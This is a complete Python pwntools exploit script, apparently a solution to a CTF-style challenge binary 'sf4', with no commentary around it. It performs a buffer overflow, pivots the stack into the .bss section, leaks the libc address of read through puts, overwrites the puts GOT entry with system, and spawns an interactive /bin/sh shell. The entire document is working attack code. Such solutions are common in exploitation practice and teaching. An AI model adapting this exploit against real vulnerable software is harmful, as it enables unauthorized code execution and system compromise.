from pwn import *

p = process("./sf4")
e = ELF("./sf4")

bss = e.bss() 
print(hex(bss))
bss = bss + 0x400

pr_gadget = 0x08048359
ppr_gadget = 0x08048599

leave_ret = 0x080484d5
read_leave_ret = 0x080484c4

read_got = e.got["read"]
read_plt = e.plt["read"]

puts_got = e.got["puts"]
puts_plt = e.plt["puts"]

p.recvuntil("payload!!\n")

pay = b""
pay += b"A" * 0x28
pay += p32(bss + 0x200) # sfp
pay += p32(read_leave_ret)
p.send(pay)

# rop start
pay = b""
pay += p32(bss + 0x300) # fake sfp
pay += p32(puts_plt)
pay += p32(pr_gadget)
pay += p32(read_got)
pay += p32(read_leave_ret)
pay += b"A" * (0x28 - len(pay)) # padding
pay += p32(bss + (0x200 - 0x28))
pay += p32(leave_ret)
p.send(pay)

read_arr = u32(p.recv(4))
libc_base = read_arr - 0xd5c20
sys_arr = libc_base + 0x3adb0
print(hex(read_arr))
print(hex(libc_base))
print(hex(sys_arr))

pay = b""
pay += p32(bss) # --> fake sfp 
pay += p32(read_plt)
pay += p32(ppr_gadget)
pay += p32(0)
pay += p32(puts_got)
pay += p32(0x10)

pay += p32(puts_plt)
pay += p32(pr_gadget)
pay += p32(puts_got + 4)
pay += b"A" * (0x28 - len(pay))
pay += p32(bss + 0x300 - 0x28)
pay += p32(leave_ret)
p.send(pay)

p.send(p32(sys_arr) + b"/bin/sh\x00")

p.interactive()